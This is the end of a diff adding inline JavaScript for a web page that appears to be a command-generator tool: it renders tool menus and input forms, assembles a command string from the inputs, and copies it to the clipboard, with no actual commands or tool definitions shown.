+                btn.className = 'tool-btn w-full text-left px-6 py-3 hover:bg-hacker-gray hover:text-white transition-colors flex items-center text-sm font-medium text-gray-400 border-l-4 border-transparent';
+                btn.onclick = () => selectTool(tool.id);
+                btn.innerHTML = `<i class="fas ${tool.icon} w-6 mr-2"></i> ${tool.name}`;
+                btn.dataset.id = tool.id;
+                toolListEl.appendChild(btn);
+            });
+        }
+
+        // --- Select Tool ---
+        function selectTool(id) {
+            currentTool = tools.find(t => t.id === id);
+            
+            // Update Sidebar UI
+            document.querySelectorAll('.tool-btn').forEach(b => {
+                if (b.dataset.id === id) {
+                    b.classList.add('active');
+                    b.classList.remove('text-gray-400');
+                    b.classList.add('text-white');
+                } else {
+                    b.classList.remove('active');
+                    b.classList.add('text-gray-400');
+                    b.classList.remove('text-white');
+                }
+            });
+
+            // Update Main Header
+            currentToolTitle.innerText = currentTool.name;
+            currentToolDesc.innerText = currentTool.desc;
+
+            // Show Panels
+            configPanel.classList.remove('hidden');
+            outputPanelEl.classList.remove('hidden');
+            emptyState.classList.add('hidden');
+
+            // Render Form
+            renderForm(currentTool);
+
+            // Close mobile sidebar if open
+            if(window.innerWidth < 768) toggleSidebar();
+            
+            // Generate initial command
+            updateCommand();
+        }
+
+        // --- Render Form ---
+        function renderForm(tool) {
+            formContainerEl.innerHTML = '';
+            tool.fields.forEach(field => {
+                const wrapper = document.createElement('div');
+                wrapper.className = 'flex flex-col space-y-2';
+                wrapper.dataset.id = field.id; // For visibility logic
+
+                const label = document.createElement('label');
+                label.className = 'text-xs text-gray-400 font-bold uppercase tracking-wider';
+                label.innerText = field.label;
+
+                let input;
+
+                if (field.type === 'select') {
+                    input = document.createElement('select');
+                    input.className = 'w-full p-2 rounded bg-black border border-gray-700 text-neon-green text-sm focus:border-neon-green focus:outline-none transition-colors';
+                    field.options.forEach(opt => {
+                        const option = document.createElement('option');
+                        option.value = opt.val;
+                        option.innerText = opt.txt;
+                        input.appendChild(option);
+                    });
+                } else if (field.type === 'checkbox') {
+                    wrapper.className = 'flex flex-row items-center justify-between p-2 bg-black border border-gray-700 rounded';
+                    label.className = 'text-sm text-gray-300 cursor-pointer select-none flex-1';
+                    label.htmlFor = `field-${field.id}`; // Accessibility
+                    
+                    const toggleWrapper = document.createElement('div');
+                    toggleWrapper.className = 'relative inline-block w-10 h-6 align-middle select-none transition duration-200 ease-in';
+                    
+                    input = document.createElement('input');
+                    input.type = 'checkbox';
+                    input.id = `field-${field.id}`;
+                    input.className = 'toggle-checkbox absolute block w-4 h-4 rounded-full bg-white border-4 appearance-none cursor-pointer top-1 left-1 transition-all duration-300';
+                    if(field.checked) input.checked = true;
+                    
+                    const toggleLabel = document.createElement('label');
+                    toggleLabel.htmlFor = `field-${field.id}`;
+                    toggleLabel.className = 'toggle-label block overflow-hidden h-6 rounded-full bg-gray-800 cursor-pointer border border-gray-600';
+                    
+                    toggleWrapper.appendChild(input);
+                    toggleWrapper.appendChild(toggleLabel);
+                    
+                    wrapper.appendChild(label);
+                    wrapper.appendChild(toggleWrapper);
+                    
+                    // Hook event manually since structure is different
+                    input.addEventListener('change', updateCommand);
+                    formContainerEl.appendChild(wrapper);
+                    return; // Skip default append
+                } else {
+                    input = document.createElement('input');
+                    input.type = field.type === 'number' ? 'number' : 'text';
+                    input.className = 'w-full p-2 rounded bg-black border border-gray-700 text-neon-green text-sm focus:border-neon-green focus:outline-none transition-colors placeholder-gray-700';
+                    if (field.placeholder) input.placeholder = field.placeholder;
+                    if (field.default) input.value = field.default;
+                }
+
+                input.id = `field-${field.id}`;
+                input.dataset.fieldId = field.id; // Store ID for retrieval
+                input.addEventListener('input', updateCommand);
+                input.addEventListener('change', updateCommand);
+
+                wrapper.appendChild(label);
+                wrapper.appendChild(input);
+                formContainerEl.appendChild(wrapper);
+            });
+        }
+
+        // --- Update Command Logic ---
+        function updateCommand() {
+            if (!currentTool) return;
+
+            const data = {};
+            
+            // Gather Data
+            currentTool.fields.forEach(field => {
+                const el = document.getElementById(`field-${field.id}`);
+                if (!el) return;
+                
+                if (field.type === 'checkbox') {
+                    data[field.id] = el.checked;
+                } else {
+                    data[field.id] = el.value;
+                }
+            });
+
+            // Handle Conditional Visibility
+            currentTool.fields.forEach(field => {
+                if (field.showIf) {
+                    const wrapper = document.querySelector(`div[data-id="${field.id}"]`);
+                    const dependencyVal = data[field.showIf.field];
+                    let visible = false;
+
+                    if (field.showIf.operator === 'in') {
+                         visible = field.showIf.val.includes(dependencyVal);
+                    } else {
+                         visible = dependencyVal === field.showIf.val;
+                    }
+
+                    if (wrapper) wrapper.style.display = visible ? 'flex' : 'none';
+                    if (!visible) data[field.id] = null; // Clear value from data if hidden
+                }
+            });
+
+            // Generate
+            const cmd = currentTool.generate(data);
+            commandOutputEl.innerText = cmd;
+        }
+
+        // --- Mobile Menu Toggle ---
+        function toggleSidebar() {
+            const isClosed = sidebar.classList.contains('-translate-x-full');
+            if (isClosed) {
+                sidebar.classList.remove('-translate-x-full');
+                sidebarOverlay.classList.remove('hidden');
+            } else {
+                sidebar.classList.add('-translate-x-full');
+                sidebarOverlay.classList.add('hidden');
+            }
+        }
+
+        mobileMenuBtn.addEventListener('click', toggleSidebar);
+        sidebarOverlay.addEventListener('click', toggleSidebar);
+
+        // --- Clipboard ---
+        copyBtn.addEventListener('click', () => {
+            const text = commandOutputEl.innerText;
+            const textarea = document.createElement('textarea');
+            textarea.value = text;
+            document.body.appendChild(textarea);
+            textarea.select();
+            try {
+                document.execCommand('copy');
+                const originalHtml = copyBtn.innerHTML;
+                copyBtn.innerHTML = '<i class="fas fa-check mr-2"></i> Copied';
+                copyBtn.classList.add('text-neon-green', 'border-neon-green');
+                setTimeout(() => {
+                    copyBtn.innerHTML = originalHtml;
+                    copyBtn.classList.remove('text-neon-green', 'border-neon-green');
+                }, 2000);
+            } catch (err) {
+                console.error('Failed to copy', err);
+            }
+            document.body.removeChild(textarea);
+        });
+
+        // Start
+        init();
+
+    </script>
+</body>
+</html>
